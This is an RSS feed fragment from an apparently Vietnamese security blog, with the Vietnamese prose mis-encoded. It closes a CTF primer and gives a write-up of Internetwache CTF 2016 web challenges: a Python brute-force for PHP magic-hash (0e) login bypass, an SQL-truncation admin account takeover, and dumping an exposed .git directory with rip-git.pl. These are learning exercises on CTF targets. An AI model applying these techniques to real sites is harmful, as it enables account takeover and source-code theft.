&lt;ul&gt;
&lt;li&gt;Chi ti·∫øt: &lt;a href="http://hakipedia.com/index.php/Local_File_Inclusion"&gt;http://hakipedia.com/index.php/Local&lt;em&gt;File&lt;/em&gt;Inclusion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;M·ªôt clip v√≠ d·ª•: &lt;a href="https://www.youtube.com/watch?v=s3XQ1n5kdeQ"&gt;https://www.youtube.com/watch?v=s3XQ1n5kdeQ&lt;/a&gt;    &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="6xss"&gt;6. XSS&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;M·ªçi th√¥ng tin chi ti·∫øt xin truy c·∫≠p v√†o link sau: &lt;a href="https://viblo.asia/Thanh/posts/73KbvZeLGmWB"&gt;Kƒ© thu·∫≠t t·∫•n c√¥ng CROSS-SITE SCRIPTING&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="7luyntp"&gt;7. Luy·ªán t·∫≠p&lt;/h4&gt;

&lt;p&gt;ƒê·ªçc qua t·∫•t c·∫£ nh·ªØng th√¥ng tin ph√≠a tr√™n th√¨ ƒë√∫ng l√† c√≥ ph·∫ßn h∆°i qu√° t·∫£i. L√∫c ƒë·∫ßu m·ªõi ch∆°i CTF m√¨nh c≈©ng kh√¥ng c√≥ nhi·ªÅu ki·∫øn th·ª©c ƒë·∫øn v·∫≠y. B√†i vi·∫øt n√†y m√¨nh mu·ªën l√† m·ªôt n∆°i t·ªïng h·ª£p t∆∞∆°ng ƒë·ªëi c√°c ki·∫øn th·ª©c c·∫ßn thi·∫øt ƒë·ªÉ c√°c b·∫°n bi·∫øt s·∫Ω c·∫ßn trang b·ªã nh·ªØng g√¨, t√¨m v·∫•n ƒë·ªÅ ·ªü ƒë√¢u,... Sau c√πng d∆∞·ªõi ƒë√¢y l√† nh·ªØng n∆°i m√¨nh ƒë√£ luy·ªán t·∫≠p CTF m√† th·∫•y r·∫•t hi·ªáu qu·∫£&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://hackthis.co.uk"&gt;http://hackthis.co.uk&lt;/a&gt; - M·ªôt site ph√π h·ª£p cho ng∆∞·ªùi m·ªõi b·∫Øt ƒë·∫ßu.&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.root-me.org/en/Challenges/Web-Server/"&gt;http://www.root-me.org/en/Challenges/Web-Server/&lt;/a&gt; - M·ªôt list challenges bao qu√°t r·∫•t nhi·ªÅu v·∫•n ƒë·ªÅ, g·ªìm c·∫£ c√°c b√†i LFI/ RFI, c√°c lo·∫°i SQLi, c√°c t√†i li·ªáu h∆∞·ªõng d·∫´n.&lt;/li&gt;
&lt;li&gt;&lt;a href="http://overthewire.org/wargames/natas/"&gt;http://overthewire.org/wargames/natas/&lt;/a&gt; - G·ªìm c·∫£ c√°c d·∫°ng b√†i v·ªÅ Command injection v√† PHP Objection Injection&lt;/li&gt;
&lt;li&gt;&lt;a href="http://webhacking.kr"&gt;http://webhacking.kr&lt;/a&gt; - C√≥ kho·∫£ng 60 challenges v·ªÅ web t·ª´ kh√≥ ƒë·∫øn d·ªÖ. M·ªôt s·ªë b√†i h∆°i mang t√≠nh th√°ch ƒë·ªë&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ringzer0team.com"&gt;http://ringzer0team.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;M·ªôt l∆∞u √Ω cu·ªëi l√† c√°c b·∫°n h√£y k·∫øt h·ª£p vi·ªác luy·ªán t·∫≠p ·ªü c√°c site ph√°i tr√™n v√† vi·ªác tham gia c√°c gi·∫£i ctf m·ªõi ra ·ªü &lt;a href="http://ctftime.org"&gt;http://ctftime.org&lt;/a&gt; n·ªØa :D. Ch√∫c c√°c b·∫°n vui v·∫ª!&lt;/p&gt;</content:encoded></item><item><title>[CTF] Write-up Internetwache CTF 2016 Web50,70,80</title><description>&lt;h3 id="web50"&gt;Web50&lt;/h3&gt;

&lt;p&gt;B√†i n√†y cho m·ªôt ƒëo·∫°n code nh∆∞ sau:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-javascript"&gt;&amp;lt;?php  
$admin_user = "pr0_adm1n";
$admin_pw = clean_hash("0e408306536730731920197920342119");

function clean_hash($hash) {  
    return preg_replace("/[^0-9a-f]/","",$hash);
}
function myhash($str) {  
    return clean_hash(md5(md5($str) . "SALT"));
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nh√¨n qua th√¨ c√≥ v·∫ª ƒëo·∫°n hash tr√™n l√† k·∫øt qu·∫£&lt;/p&gt;</description><link>http://localhost:2368/ctf-write-up-internetwache-ctf-2016-web50-70-80/</link><guid isPermaLink="false">01d3072c-1be3-4a1d-a275-4c0f96b7f82d</guid><category>CTF</category><category>web</category><dc:creator>Do Anh</dc:creator><pubDate>Tue, 23 Feb 2016 17:38:00 GMT</pubDate><content:encoded>&lt;h3 id="web50"&gt;Web50&lt;/h3&gt;

&lt;p&gt;B√†i n√†y cho m·ªôt ƒëo·∫°n code nh∆∞ sau:&lt;/p&gt;

&lt;pre&gt;&lt;code class="language-javascript"&gt;&amp;lt;?php  
$admin_user = "pr0_adm1n";
$admin_pw = clean_hash("0e408306536730731920197920342119");

function clean_hash($hash) {  
    return preg_replace("/[^0-9a-f]/","",$hash);
}
function myhash($str) {  
    return clean_hash(md5(md5($str) . "SALT"));
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nh√¨n qua th√¨ c√≥ v·∫ª ƒëo·∫°n hash tr√™n l√† k·∫øt qu·∫£ c·ªßa 2 l·∫ßn md5 k√®m v·ªõi m·ªôt chu·ªói "SALT". &lt;/p&gt;

&lt;p&gt;·∫¶y, nh∆∞ng ƒë·ªÉ √Ω ƒëo·∫°n hash kh√° l·∫°. B·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;0e&lt;/code&gt; v√† theo sau ƒë·∫•y ch·ªâ to√†n l√† s·ªë. C√≥ khi n√†o t∆∞∆°ng t·ª± nh∆∞ ki·ªÉu chu·ªói d·∫°ng hex &lt;code&gt;0x&lt;/code&gt; ho·∫∑c binary &lt;code&gt;0b&lt;/code&gt; trong sql? Sau khi google m·ªôt l√∫c th√¨ m√¨nh ƒë√£ c√≥ m·ªôt s·ªë th√¥ng tin th√∫ v·ªã t·ª´ c√°i chu·ªói &lt;code&gt;0e&lt;/code&gt; n√†y &lt;a href="http://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo"&gt;&lt;strong&gt;Why md5('240610708') is equal to md5('QNKCDZO')?&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Nh∆∞ v·∫≠y b√¢y gi·ªù c·∫ßn bruteforce ra m·ªôt hash t·ª´ c√¥ng th·ª©c &lt;code&gt;md5(md5($password)."SALT")&lt;/code&gt; m√† c√≥ k√Ω t·ª± ƒë·∫ßu l√† &lt;code&gt;0e&lt;/code&gt; ho·∫∑c &lt;code&gt;00e&lt;/code&gt; , ... v√† theo sau to√†n l√† s·ªë.&lt;/p&gt;

&lt;p&gt;Code python:  &lt;/p&gt;

&lt;pre&gt;&lt;code class="language-javascript"&gt;import hashlib

datax = raw_input("Input: ")  
i = 0  
while True:  
    alpha = hashlib.md5()
    alpha.update(str(i))
    beta = hashlib.md5()
    beta.update(str(alpha.hexdigest())+"SALT")
    rs = beta.hexdigest()
    if rs[:2]=="0e" or rs[:3] == "00e":
        if rs[2:31].isdigit() or rs[3:31].isdigit():
            print "[+] FOUND:"+str(i) 
            raw_input("Press c to continue searching")
    if i % 1000 == 0:
        print "[+] Searching: "+str(i)+" | "+rs
    i = i + 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;K·∫øt qu·∫£ in ra ch√≠nh l√† password ta c·∫ßn: &lt;code&gt;62778807&lt;/code&gt;&lt;/p&gt;

&lt;h3 id="web70"&gt;Web70&lt;/h3&gt;

&lt;p&gt;B√†i n√†y d√πng l·ªói sql truncation ƒë·ªÉ t·∫•n c√¥ng. &lt;br&gt;
Register m·ªôt account v·ªõi username &lt;code&gt;admin                     x&lt;/code&gt;, password b·∫•t k·ª≥. Sau ƒë√≥ ta s·∫Ω login ƒë∆∞·ª£c th√†nh c√¥ng v√†o account &lt;code&gt;admin&lt;/code&gt; v√¨ ƒëo·∫°n ph√≠a sau c·ªßa username v∆∞·ª£t qu√° s·ªë k√Ω t·ª± trong database.&lt;/p&gt;

&lt;h3 id="web80"&gt;Web80&lt;/h3&gt;

&lt;p&gt;M·ªôt site ch·ªâ c√≥ code HTML &gt; &lt;a href="https://github.com/internetwache/Internetwache-CTF-2016/blob/master/tasks/web80/code/index.html"&gt;Source&lt;/a&gt; &lt;br&gt;
ƒê·ªÉ √Ω c√≥ m·ªôt d√≤ng l√†:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;It's 2016 now and I need to somehow keep track of my changes to this document as it grows and grows. All people are talking about a tool called '&lt;strong&gt;Git&lt;/strong&gt;'. I think I might give this a try.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Th·ª≠ truy c·∫≠p &lt;code&gt;https://0ldsk00lblog.ctf.internetwache.org/.git/HEAD&lt;/code&gt; th√†nh c√¥ng =&gt; Gi·ªù ph·∫£i b√™ th∆∞ m·ª•c .git n√†y v·ªÅ ƒë·ªÉ ki·ªÉm tra xem c√≥ g√¨&lt;/p&gt;

&lt;p&gt;M√¨nh d√πng m·ªôt tool c√≥ s·∫µn, code b·∫±ng perl &gt; &lt;a href="https://github.com/kost/dvcs-ripper/blob/master/rip-git.pl"&gt;rip-git.pl&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ch·∫°y tool v√† string &lt;code&gt;flag&lt;/code&gt; trong th∆∞ m·ª•c .git n√†y  &lt;/p&gt;

&lt;pre&gt;&lt;code class="language-javascript"&gt;$ PERL_LWP_SSL_VERIFY_HOSTNAME=0 ./rip-git.pl -v -u https://0ldsk00lblog.ctf.internetwache.org/.git
$ grep -r "flag" ./
flag IW{G1T_1S_4W3SOME}  
&lt;/code&gt;&lt;/pre&gt;</content:encoded></item></channel></rss>